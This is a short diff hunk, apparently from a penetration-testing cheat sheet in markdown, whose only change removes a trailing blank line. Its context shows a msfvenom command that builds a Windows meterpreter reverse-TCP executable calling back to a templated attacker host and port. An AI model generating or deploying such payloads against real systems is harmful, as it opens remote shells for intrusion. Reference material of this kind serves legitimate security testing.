@@ -22,4 +22,3 @@
 - Create an exe with a reverse tcp handler:
 
 `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe > reverseTcp.exe`
-
